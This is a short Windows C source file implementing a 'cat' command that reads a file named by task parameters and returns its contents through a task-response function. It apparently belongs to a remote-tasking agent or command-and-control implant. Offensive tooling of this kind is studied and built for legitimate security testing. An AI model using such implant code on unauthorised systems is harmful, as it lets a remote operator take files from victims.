#define _WIN32_WINNT 0x0600
#include "commands.h"
#include "utils.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#ifdef INCLUDE_CMD_CAT

void command_cat(char *task_id, char *params) {
    char path[MAX_PATH] = {0};
    if (params[0] == '{') {
        extract_json_string(params, "path", path, sizeof(path));
    } else {
        strncpy(path, params, sizeof(path) - 1);
    }

    if (path[0] == '\0') {
        send_task_response(task_id, "Error: no path specified");
        return;
    }

    /* Normalize forward slashes to backslashes */
    for (char *p = path; *p; p++)
        if (*p == '/') *p = '\\';

    HANDLE hFile = CreateFileA(path, GENERIC_READ,
                               FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        char msg[MAX_PATH + 64];
        snprintf(msg, sizeof(msg), "Error: cannot open '%s' (err %lu)", path, GetLastError());
        send_task_response(task_id, msg);
        return;
    }

    LARGE_INTEGER file_size;
    if (!GetFileSizeEx(hFile, &file_size) || file_size.QuadPart == 0) {
        CloseHandle(hFile);
        send_task_response(task_id, "");
        return;
    }
    if (file_size.QuadPart > 10 * 1024 * 1024) {
        CloseHandle(hFile);
        send_task_response(task_id, "Error: file too large (> 10 MB), use download instead");
        return;
    }

    SIZE_T sz = (SIZE_T)file_size.QuadPart;
    char *buf = (char *)malloc(sz + 1);
    if (!buf) {
        CloseHandle(hFile);
        send_task_response(task_id, "Error: out of memory");
        return;
    }

    DWORD bytes_read = 0;
    BOOL ok = ReadFile(hFile, buf, (DWORD)sz, &bytes_read, NULL);
    CloseHandle(hFile);

    if (!ok) {
        free(buf);
        char msg[64];
        snprintf(msg, sizeof(msg), "Error: ReadFile failed (err %lu)", GetLastError());
        send_task_response(task_id, msg);
        return;
    }

    buf[bytes_read] = '\0';
    send_task_response(task_id, buf);
    free(buf);
}

#endif
